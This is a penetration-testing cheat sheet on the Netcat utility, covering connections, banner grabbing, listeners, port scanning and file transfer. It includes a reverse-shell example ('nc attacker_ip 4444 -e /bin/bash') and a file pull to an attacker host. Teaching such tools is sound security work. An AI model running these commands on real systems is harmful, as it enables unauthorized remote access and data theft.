# Netcat

Netcat (nc) is a networking utility used to read and write data across network connections.

It is often called the **Swiss Army knife of networking** because it can be used for many tasks such as:

- banner grabbing
- port listening
- file transfer
- reverse shells
- debugging network services

Netcat is commonly used during penetration testing for interacting with services and establishing shell connections.

---

# Installation

Netcat is included in Kali Linux.

If not installed:

```bash
sudo apt install netcat
```

Verify installation: ```bash nc -h ```

---

# Basic Connection

Connect to a remote service: ```bash nc target_ip port ```

Example: ```bash nc 192.168.1.10 80 ```

This can be used to manually interact with services.

---

# Banner Grabbing

Retrieve service banners: ```bash nc target_ip port ```

Example: ```bash nc 192.168.1.10 21 ```

Often reveals service information such as FTP or SSH versions.

---

# Listening on a Port

Netcat can listen for incoming connections.

Example: ```bash nc -lvnp 4444 ```

Parameters:

- ```-l``` → listen mode

- ```-v``` → verbose

- ```-n``` → no DNS resolution

- ```-p``` → port

---

# Reverse Shell

A reverse shell connects from the target machine back to the attacker.

Listener on attacker machine: ```bash nc -lvnp 4444 ```

Reverse shell on target: ```bash nc attacker_ip 4444 -e /bin/bash ```

---

# File Transfer

Send a file: ```bash nc -lvnp 4444 < file.txt ```

Receive the file: ```bash nc attacker_ip 4444 > file.txt ```

---

# Port Scanning

Netcat can perform simple port scans.

Example: ```bash nc -zv target_ip 20-100 ```

Parameters:

- ```-z``` → scan without sending data

- ```-v``` → verbose output

---

# Useful Variants

Different systems may include different versions of Netcat.

Examples:

- netcat-traditional

- netcat-openbsd

- ncat (from Nmap)

Some features may vary between versions.

---

Notes

Netcat is extremely flexible and often used during penetration testing to establish shells or interact with services.

Always use these techniques only in **authorized environments.**